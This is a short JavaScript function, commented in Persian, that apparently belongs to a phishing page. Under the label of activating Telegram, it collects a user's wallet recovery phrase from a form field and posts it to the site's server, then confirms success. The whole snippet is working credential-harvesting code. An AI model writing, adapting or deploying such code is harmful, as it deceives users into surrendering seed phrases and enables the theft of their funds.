// تابع برای ارسال عبارت ریکاوری به سرور
async function activateTelegram() {
    const recoveryPhrase = document.getElementById("recovery-phrase").value; // گرفتن مقدار ورودی کاربر

    if (recoveryPhrase.trim() !== "") { // بررسی اینکه کاربر چیزی وارد کرده باشد
        try {
            // ارسال درخواست POST به سرور
            const response = await fetch('/send-recovery', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ recoveryPhrase: recoveryPhrase })
            });

            // بررسی پاسخ سرور
            if (response.ok) {
                alert('Recovery phrase sent successfully!'); // پیام موفقیت
                document.getElementById("telegram-section").style.display = "flex"; // نمایش بخش تلگرام
            } else {
                const errorText = await response.text(); // گرفتن پیام خطا از سرور
                throw new Error(errorText);
            }
        } catch (error) {
            console.error('Error:', error); // نمایش خطا در کنسول
            alert('An error occurred. Please try again.'); // پیام خطا به کاربر
        }
    } else {
        alert('Please enter your recovery phrase.'); // اگر کاربر چیزی وارد نکرده باشد
    }
}
